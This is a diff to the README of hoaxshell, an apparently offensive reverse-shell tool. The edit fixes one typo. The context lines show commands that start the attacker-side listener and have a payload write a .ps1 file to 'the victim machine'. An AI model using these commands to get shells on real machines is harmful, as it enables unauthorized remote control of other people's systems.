@@ -42,7 +42,7 @@ sudo python3 hoaxshell.py -s <your_ip>
 ```  
 
 #### Payload that writes and executes commands from a file
-Use `-x` to provide a .ps1 file name (absolute path) to be created on the victim machine. You should check the raw payload before executing, make sure the path you proveded is solid.
+Use `-x` to provide a .ps1 file name (absolute path) to be created on the victim machine. You should check the raw payload before executing, make sure the path you provided is solid.
 ```
 sudo python3 hoaxshell.py -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"
 ```  
